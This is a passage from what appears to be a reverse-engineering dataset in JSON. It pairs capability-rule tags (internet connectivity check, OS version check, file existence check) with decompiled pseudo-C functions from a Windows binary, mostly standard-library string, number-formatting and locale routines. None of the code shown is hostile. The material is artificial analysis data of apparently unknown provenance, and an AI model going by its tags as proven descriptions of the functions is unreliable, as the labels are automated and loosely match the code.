        "decompiled_code": "\nuint * __thiscall fcn.00493990(uint *param_1, ushort *param_2, int32_t param_3)\n\n{\n    ushort *puVar1;\n    uint *extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t uVar2;\n    uint32_t uStack68;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uint *puStack52;\n    ushort *puStack48;\n    ushort *puStack40;\n    int32_t iStack36;\n    uint32_t uStack24;\n    \n    if ((param_2 == NULL) && (param_3 != 0)) {\n        puStack48 = 0x493a36;\n        fcn.0049eb30(\"basic_string::_M_construct null not valid\");\n        puStack48 = param_2;\n        iStack56 = param_3;\n        puStack52 = param_1;\n        if ((puStack40 == NULL) && (iStack36 != 0)) {\n            fcn.0049eb30(\"basic_string::_M_construct null not valid\");\n            return extraout_ECX_00 + 8;\n        }\n        uStack60 = iStack36 - puStack40 >> 1;\n        if (uStack60 < 8) {\n            puVar1 = *extraout_ECX;\n            if (uStack60 == 1) {\n                *puVar1 = *puStack40;\n                goto code_r0x00493a78;\n            }\n            if (uStack60 == 0) goto code_r0x00493a78;\n        }\n        else {\n            puVar1 = fcn.00495640(&stack0xffffffc4, 0);\n            *extraout_ECX = puVar1;\n            extraout_ECX[2] = uStack68;\n        }\n        sub.msvcrt.dll_memcpy(puVar1, puStack40, iStack36 - puStack40);\n        puVar1 = *extraout_ECX;\n        uStack60 = uStack68;\ncode_r0x00493a78:\n        extraout_ECX[1] = uStack60;\n        puVar1[uStack60] = 0;\n        return puVar1;\n    }\n    uVar2 = param_3 - param_2 >> 1;\n    if (uVar2 < 8) {\n        puStack52 = *param_1;\n        if (uVar2 == 1) {\n            *puStack52 = *param_2;\n            goto code_r0x004939c8;\n        }\n        if (uVar2 == 0) goto code_r0x004939c8;\n    }\n    else {\n        puStack48 = 0x493a06;\n        puStack52 = fcn.00495640();\n        *param_1 = puStack52;\n        param_1[2] = uStack24;\n    }\n    puStack48 = param_2;\n    iStack56 = 0x493a22;\n    sub.msvcrt.dll_memcpy();\n    puStack52 = *param_1;\n    uVar2 = uStack24;\ncode_r0x004939c8:\n    param_1[1] = uVar2;\n    *(puStack52 + uVar2 * 2) = 0;\n    return puStack52;\n}\n",
        "token_count": 724
    },
    "00493a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort * __thiscall fcn.00493a40(uint *param_1, ushort *param_2, int32_t param_3)\n\n{\n    ushort *puVar1;\n    int32_t extraout_ECX;\n    uint32_t uStack24;\n    uint32_t uStack16;\n    \n    if ((param_2 == NULL) && (param_3 != 0)) {\n        fcn.0049eb30(\"basic_string::_M_construct null not valid\");\n        return extraout_ECX + 8;\n    }\n    uStack16 = param_3 - param_2 >> 1;\n    if (uStack16 < 8) {\n        puVar1 = *param_1;\n        if (uStack16 == 1) {\n            *puVar1 = *param_2;\n            goto code_r0x00493a78;\n        }\n        if (uStack16 == 0) goto code_r0x00493a78;\n    }\n    else {\n        puVar1 = fcn.00495640(&uStack16, 0);\n        *param_1 = puVar1;\n        param_1[2] = uStack24;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, param_2, param_3 - param_2);\n    puVar1 = *param_1;\n    uStack16 = uStack24;\ncode_r0x00493a78:\n    param_1[1] = uStack16;\n    puVar1[uStack16] = 0;\n    return puVar1;\n}\n",
        "token_count": 338
    },
    "00493c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00493c70(int32_t *param_1, int32_t param_2, uint32_t param_3, uint32_t param_4, ushort param_5)\n\n{\n    ushort *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    ushort *puVar5;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    ushort uStack48;\n    \n    iVar4 = param_1[1];\n    if (param_4 <= (param_3 + 0x3fffffff) - iVar4) {\n        piVar2 = *param_1;\n        uVar6 = (param_4 - param_3) + iVar4;\n        if (piVar2 == param_1 + 2) {\n            uVar3 = 7;\n        }\n        else {\n            uVar3 = param_1[2];\n        }\n        if (uVar3 < uVar6) {\n            uStack48 = param_4;\n            fcn.004956c0(param_2, param_3, 0);\n            piVar2 = *param_1;\n        }\n        else {\n            iVar4 = iVar4 - (param_3 + param_2);\n            if ((iVar4 != 0) && (param_3 != param_4)) {\n                puVar5 = piVar2 + param_3 * 2 + param_2 * 2;\n                puVar1 = piVar2 + param_4 * 2 + param_2 * 2;\n                if (iVar4 == 1) {\n                    *puVar1 = *puVar5;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar1, puVar5, iVar4 * 2);\n                    piVar2 = *param_1;\n                }\n            }\n        }\n        if (param_4 != 0) {\n            puVar5 = piVar2 + unaff_ESI * 2;\n            if (param_4 == 1) {\n                *puVar5 = uStack48;\n            }\n            else {\n                do {\n                    *puVar5 = param_5;\n                    puVar5 = puVar5 + 1;\n                    param_4 = param_4 - 1;\n                } while (param_4 != 0);\n            }\n        }\n        param_1[1] = uVar6;\n        *(piVar2 + uVar6 * 2) = 0;\n        return param_1;\n    }\n    fcn.0049ec30(\"basic_string::_M_replace_aux\");\n    return extraout_ECX;\n}\n",
        "token_count": 593
    },
    "00495350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00495350(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint32_t uVar6;\n    \n    uVar2 = param_1[1];\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    puVar3 = *param_1;\n    piVar1 = param_1 + 2;\n    if (piVar1 == puVar3) {\n        uVar6 = 7;\n    }\n    else {\n        uVar6 = param_1[2];\n    }\n    if (uVar6 != param_2) {\n        if ((7 < param_2) || (uVar6 < param_2)) {\n            puVar4 = fcn.00495640(&param_2, uVar6);\n            puVar3 = *param_1;\n            iVar5 = param_1[1] + 1;\n            if (iVar5 == 1) {\n                *puVar4 = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar5 * 2);\n            }\n            if (piVar1 != puVar3) {\n                fcn.004a34c0(puVar3);\n            }\n            *param_1 = puVar4;\n            param_1[2] = unaff_EBP;\n            return;\n        }\n        if (piVar1 != puVar3) {\n            iVar5 = uVar2 + 1;\n            if (iVar5 == 1) {\n                *(param_1 + 2) = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(piVar1, puVar3, iVar5 * 2);\n            }\n            fcn.004a34c0(puVar3);\n            *param_1 = piVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "004954e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004954e0(int32_t *param_1, ushort *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    \n    iVar3 = param_1[1];\n    piVar4 = *param_1;\n    uVar1 = iVar3 + param_3;\n    if (piVar4 == param_1 + 2) {\n        uVar5 = 7;\n    }\n    else {\n        uVar5 = param_1[2];\n    }\n    if (uVar5 < uVar1) {\n        fcn.004956c0(iVar3, 0, param_2, param_3);\n        piVar4 = *param_1;\n    }\n    else if (param_3 != 0) {\n        puVar2 = piVar4 + iVar3 * 2;\n        if (param_3 == 1) {\n            *puVar2 = *param_2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar2, param_2, param_3 * 2);\n            piVar4 = *param_1;\n        }\n    }\n    param_1[1] = uVar1;\n    *(piVar4 + uVar1 * 2) = 0;\n    return param_1;\n}\n",
        "token_count": 324
    },
    "00495580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00495580(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uStack40;\n    uint32_t auStack32 [4];\n    \n    if (param_1 != param_2) {\n        puVar2 = *param_1;\n        uVar1 = param_2[1];\n        if (param_1 + 2 == puVar2) {\n            uVar3 = 7;\n        }\n        else {\n            uVar3 = param_1[2];\n        }\n        if (uVar3 < uVar1) {\n            auStack32[0] = uVar1;\n            puVar2 = fcn.00495640(auStack32, uVar3);\n            if (param_1 + 2 != *param_1) {\n                fcn.004a34c0(*param_1);\n            }\n            *param_1 = puVar2;\n            param_1[2] = uStack40;\n        }\n        if (uVar1 != 0) {\n            if (uVar1 == 1) {\n                *puVar2 = **param_2;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar2, *param_2, uVar1 * 2);\n                puVar2 = *param_1;\n            }\n        }\n        param_1[1] = uVar1;\n        *(puVar2 + uVar1 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "004956c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004956c0(int32_t *param_1, ushort *param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    int32_t iStack64;\n    ushort *puStack60;\n    int32_t iStack40;\n    int32_t aiStack32 [4];\n    \n    iVar1 = param_1[1];\n    aiStack32[0] = (param_5 - param_3) + iVar1;\n    if (param_1 + 2 == *param_1) {\n        iVar4 = 7;\n    }\n    else {\n        iVar4 = param_1[2];\n    }\n    puVar3 = fcn.00495640(aiStack32, iVar4);\n    puVar2 = *param_1;\n    if (param_2 != NULL) {\n        if (param_2 == 0x1) {\n            *puVar3 = *puVar2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, puVar2, param_2 * 2);\n        }\n    }\n    if ((param_2 != NULL) && (param_3 != 0)) {\n        if (param_3 == 1) {\n            puVar3[param_2] = *param_2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + param_2, param_2, param_3 * 2);\n        }\n    }\n    if (iStack64 != 0) {\n        if (iStack64 == 1) {\n            puVar3[param_2 + param_3] = puVar2[iVar1 - (param_2 + param_3)];\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + param_2 + param_3, puVar2 + (iVar1 - (param_2 + param_3)), iStack64 * 2);\n        }\n    }\n    if (puStack60 != puVar2) {\n        fcn.004a34c0(puVar2);\n    }\n    *param_1 = puVar3;\n    param_1[2] = iStack40;\n    return;\n}\n",
        "token_count": 510
    },
    "0049d5d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0049d5d0(uchar *param_1, uint32_t param_2, int32_t param_3, uint32_t param_4, char param_5)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    \n    puVar3 = param_1;\n    if (param_5 == '\\0') {\n        if ((param_4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 7;\n                param_2 = param_2 >> 3;\n                *puVar3 = *(param_3 + 4 + uVar2);\n            } while (param_2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 0xf;\n                param_2 = param_2 >> 4;\n                *puVar3 = *(param_3 + 0x14 + (-((param_4 & 0x4000) == 0) & 0xfffffff0) + uVar2);\n            } while (param_2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(param_3 + 4 + param_2 % 10);\n            bVar1 = 9 < param_2;\n            param_2 = param_2 / 10;\n        } while (bVar1);\n    }\n    return param_1 - puVar3;\n}\n",
        "token_count": 365
    },
    "0049d680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0049d680(uchar *param_1, uint32_t param_2, uint32_t param_3, int32_t param_4, uint32_t param_5, char param_6\n                    )\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_4h;\n    int32_t var_14h;\n    \n    uVar5 = CONCAT44(param_3, param_2);\n    puVar2 = param_1;\n    if (param_6 == '\\0') {\n        if ((param_5 & 0x4a) == 0x40) {\n            do {\n                uVar3 = param_2 >> 3 | param_3 << 0x1d;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 3;\n                *puVar2 = *(var_14h + 4 + (param_2 & 7));\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n        else {\n            do {\n                uVar3 = param_2 >> 4 | param_3 << 0x1c;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 4;\n                *puVar2 = *(var_14h + 0x14 + (-((param_5 & 0x4000) == 0) & 0xfffffff0) + (param_2 & 0xf));\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n    }\n    else {\n        do {\n            iVar4 = uVar5 >> 0x20;\n            uVar3 = uVar5;\n            puVar2 = puVar2 + -1;\n            iVar1 = fcn.00418a80(uVar5, 10, 0);\n            *puVar2 = *(var_14h + 4 + iVar1);\n            uVar5 = fcn.00418980(uVar5, 10, 0);\n        } while (iVar4 != 0 || -iVar4 < (9 < uVar3));\n    }\n    return param_1 - puVar2;\n}\n",
        "token_count": 525
    },
    "0049d770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0049d770(ushort *param_1, uint32_t param_2, int32_t param_3, uint32_t param_4, char param_5)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    \n    puVar3 = param_1;\n    if (param_5 == '\\0') {\n        if ((param_4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 7;\n                param_2 = param_2 >> 3;\n                *puVar3 = *(param_3 + 8 + uVar2 * 2);\n            } while (param_2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 0xf;\n                param_2 = param_2 >> 4;\n                *puVar3 = *(param_3 + (uVar2 + (-((param_4 & 0x4000) == 0) & 0xfffffff0) + 0x14) * 2);\n            } while (param_2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(param_3 + 8 + (param_2 % 10) * 2);\n            bVar1 = 9 < param_2;\n            param_2 = param_2 / 10;\n        } while (bVar1);\n    }\n    return param_1 - puVar3 >> 1;\n}\n",
        "token_count": 379
    },
    "0049d820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0049d820(ushort *param_1, uint32_t param_2, uint32_t param_3, int32_t param_4, uint32_t param_5, \n                    char param_6)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ushort *var_8h;\n    \n    uVar5 = CONCAT44(param_3, param_2);\n    puVar2 = var_8h;\n    if (param_6 == '\\0') {\n        if ((param_5 & 0x4a) == 0x40) {\n            do {\n                uVar3 = param_2 >> 3 | param_3 << 0x1d;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 3;\n                *puVar2 = *(param_4 + 8 + (param_2 & 7) * 2);\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n        else {\n            do {\n                uVar3 = param_2 >> 4 | param_3 << 0x1c;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 4;\n                *puVar2 = *(param_4 + ((param_2 & 0xf) + (-((param_5 & 0x4000) == 0) & 0xfffffff0) + 0x14) * 2);\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n    }\n    else {\n        do {\n            iVar4 = uVar5 >> 0x20;\n            uVar3 = uVar5;\n            puVar2 = puVar2 + -1;\n            iVar1 = fcn.00418a80(uVar5, 10, 0);\n            *puVar2 = *(param_4 + 8 + iVar1 * 2);\n            uVar5 = fcn.00418980(uVar5, 10, 0);\n        } while (iVar4 != 0 || -iVar4 < (9 < uVar3));\n    }\n    return var_8h - puVar2 >> 1;\n}\n",
        "token_count": 531
    },
    "0049dc10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0049dc10(char *param_1, double *param_2, uint *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    float10 fVar4;\n    char *apcStack32 [4];\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.004a34e0(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, 0x504e00);\n    fVar4 = fcn.0041d150(param_1, apcStack32);\n    *param_2 = fVar4;\n    if ((apcStack32[0] == param_1) || (*apcStack32[0] != '\\0')) {\n        *param_2 = 0.0;\n        *param_3 = 4;\n    }\n    else if ((fVar4 < *0x504e88) || (*0x504e80 < fVar4)) {\n        if (fVar4 <= 0) {\n            *param_2 = *0x504e88;\n            *param_3 = 4;\n        }\n        else {\n            *param_2 = *0x504e80;\n            *param_3 = 4;\n        }\n    }\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.004a34b0(uVar3);\n    return;\n}\n",
        "token_count": 362
    },
    "0049dd30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0049dd30(char *param_1, float10 *param_2, uint *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    float10 fVar4;\n    float10 fVar5;\n    char *apcStack32 [4];\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.004a34e0(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, 0x504e00);\n    fVar4 = fcn.0041e070(param_1, apcStack32);\n    *param_2 = fVar4;\n    if ((apcStack32[0] == param_1) || (*apcStack32[0] != '\\0')) {\n        *param_2 = 0;\n        *param_3 = 4;\n    }\n    else if ((fVar4 < *0x504ea0) || (*0x504e90 < fVar4)) {\n        fVar5 = *0x504ea0;\n        if (0 < fVar4) {\n            fVar5 = *0x504e90;\n        }\n        *param_2 = fVar5;\n        *param_3 = 4;\n    }\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.004a34b0(uVar3);\n    return;\n}\n",
        "token_count": 361
    },
    "0049de40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0049de40(char *param_1, float *param_2, uint *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    float fVar4;\n    float10 fVar5;\n    char *apcStack32 [4];\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.004a34e0(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, 0x504e00);\n    fVar5 = fcn.0041d250(param_1, apcStack32);\n    *param_2 = fVar5;\n    if ((apcStack32[0] == param_1) || (*apcStack32[0] != '\\0')) {\n        *param_2 = 0.0;\n        *param_3 = 4;\n    }\n    else if ((fVar5 < *0x504e78) || (*0x504e74 < fVar5)) {\n        fVar4 = *0x504e78;\n        if (0 < fVar5) {\n            fVar4 = *0x504e74;\n        }\n        *param_2 = fVar4;\n        *param_3 = 4;\n    }\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.004a34b0(uVar3);\n    return;\n}\n",
        "token_count": 361
    },
    "004a39c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.004a39c0(char *param_1)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EBP;\n    ulong uVar5;\n    uchar *in_stack_00000034;\n    int32_t in_stack_00000038;\n    uint uVar6;\n    \n    if (*param_1 != '\\0') {\n        return NULL;\n    }\n    if (*0x4f59f4 != 0) {\n        fcn.00418ba0(0x4f74a8, 0x428f70);\n        if (*0x4f59f4 == 0) {\n            if (*param_1 != '\\0') {\n                return NULL;\n            }\n        }\n        else {\n            iVar3 = fcn.00418e60(*0x4f68a0);\n            if (iVar3 != 0) goto code_r0x004a3a6a;\n            if (*param_1 != '\\0') {\n                if (*0x4f59f4 == 0) {\n                    return NULL;\n                }\n                iVar3 = fcn.00418f30(*0x4f68a0);\n                if (iVar3 == 0) {\n                    return NULL;\n                }\n                fcn.0042a750();\n                goto code_r0x004a3a65;\n            }\n        }\n        if (param_1[1] != '\\0') {\n            fcn.00428b90();\n            return NULL;\n        }\ncode_r0x004a39e7:\n        param_1[1] = '\\x01';\n        return 0x1;\n    }\n    if (*param_1 != '\\0') {\n        return NULL;\n    }\n    if (param_1[1] == '\\0') goto code_r0x004a39e7;\ncode_r0x004a3a65:\n    fcn.00428b90();\ncode_r0x004a3a6a:\n    puVar2 = fcn.004a3610(4);\n    *puVar2 = 0x509dc8;\n    puVar2 = fcn.004a3bc0(puVar2, 0x506a48, 0x42a4f0);\n    if ((*0x4f59f4 != 0) && (iVar3 = fcn.00418f30(*0x4f68a0),  iVar3 != 0)) {\n        fcn.0042a750();\n    }\n    uVar5 = fcn.0041b360(puVar2);\n    if (uVar5 >> 0x20 == -1) {\n        fcn.004a37a0(uVar5);\n    }\n    uVar5 = fcn.0041b360();\n    if (uVar5 >> 0x20 == -1) {\n        fcn.004a37a0(uVar5);\n    }\n    uVar5 = fcn.0041b360();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    uVar5 = fcn.004a37a0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    uVar5 = fcn.004a37a0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    uVar5 = fcn.004a37a0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    uVar5 = fcn.004a37a0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    uVar5 = fcn.004a37a0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    fcn.004a37a0();\n    *puVar2 = 0x50b174;\n    fcn.0048f380();\n    fcn.0041b360();\n    *puVar2 = 0x50b1a0;\n    fcn.0048f380();\n    fcn.0041b360();\n    fcn.004a34c0(puVar2);\n    fcn.0041b360();\n    fcn.004a34c0(puVar2);\n    fcn.0041b360();\n    *puVar2 = 0x50b174;\n    fcn.0048f380();\n    fcn.0041b360();\n    *puVar2 = 0x50b1a0;\n    fcn.0048f380();\n    uVar5 = fcn.0041b360();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    uVar5 = fcn.004a37a0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0041b360(uVar5);\n    }\n    uVar5 = fcn.004a37a0();\n    uVar6 = uVar5;\n    if (uVar5 >> 0x20 != 1) {\ncode_r0x004a6176:\n        fcn.004a36d0(uVar6);\n        iVar3 = *(*unaff_EBP + -0xc);\n        puVar1 = unaff_EBP + iVar3 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(unaff_EBP + iVar3 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n        if (in_stack_00000038 < 1) {\n            iVar3 = unaff_EBP[1];\n        }\n        else {\n            *in_stack_00000034 = 0;\n            iVar3 = unaff_EBP[1];\n        }\n        if (iVar3 == 0) {\n            fcn.0049c600(*(unaff_EBP + *(*unaff_EBP + -0xc) + 0x14) | 4);\n            return unaff_EBP;\n        }\n        return unaff_EBP;\n    }\n    fcn.004a36d0(uVar6);\n    unaff_EBP = unaff_EBP + *(*unaff_EBP + -0xc);\n    unaff_EBP[5] = unaff_EBP[5] | 1;\n    if ((*(unaff_EBP + 4) & 1) != 0) {\n        fcn.004a3b60();\n        goto code_r0x004a6176;\n    }\n    piVar4 = fcn.004a3b60();\n    fcn.004a3840();\n    uVar5 = fcn.0041b360(piVar4);\n    uVar6 = uVar5;\n    if (uVar5 >> 0x20 == 1) {\n        fcn.004a36d0(uVar6);\n        piVar4 = piVar4 + *(*piVar4 + -0xc);\n        piVar4[5] = piVar4[5] | 1;\n        if ((*(piVar4 + 4) & 1) != 0) {\n            fcn.004a3b60();\n            goto code_r0x004a61fd;\n        }\n    }\n    else {\ncode_r0x004a61fd:\n        fcn.004a36d0(uVar6);\n        iVar3 = *(*piVar4 + -0xc);\n        puVar1 = piVar4 + iVar3 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piVar4 + iVar3 + 0x10) & 1) == 0) goto code_r0x004686f6;\n        fcn.004a3b60();\n    }\n    piVar4 = fcn.004a3b60();\n    fcn.004a3840();\n    fcn.0041b360(piVar4);\ncode_r0x004686f6:\n    fcn.004a3840();\n    return piVar4;\n}\n",
        "token_count": 1889
    },
    "0041b710": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0041b710(void)\n\n{\n    uint8_t in_AL;\n    uint8_t uVar1;\n    int32_t extraout_EDX;\n    int32_t iVar2;\n    uint64_t uVar3;\n    \n    if (in_AL == 0xff) {\n        return 0;\n    }\n    uVar1 = in_AL & 7;\n    if (uVar1 == 2) {\n        return 2;\n    }\n    if (uVar1 < 3) {\n        if ((in_AL & 7) == 0) {\n            return 4;\n        }\n    }\n    else {\n        if (uVar1 == 3) {\n            return 4;\n        }\n        if (uVar1 == 4) {\n            return 8;\n        }\n    }\n    uVar3 = sub.msvcrt.dll_abort();\n    iVar2 = uVar3 >> 0x20;\n    if (uVar3 == 0xff) {\n        return 0;\n    }\n    uVar1 = uVar3 & 0x70;\n    if (uVar1 != 0x20) {\n        if (uVar1 < 0x21) {\n            if ((uVar3 & 0x70) == 0) {\n                return 0;\n            }\n            if (uVar1 == 0x10) {\n                return 0;\n            }\n        }\n        else {\n            if (uVar1 == 0x30) {\n                return *(iVar2 + 8);\n            }\n            if (uVar1 == 0x50) {\n                return 0;\n            }\n        }\n        sub.msvcrt.dll_abort();\n        iVar2 = extraout_EDX;\n    }\n    return *(iVar2 + 4);\n}\n",
        "token_count": 382
    },
    "0049ab00": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
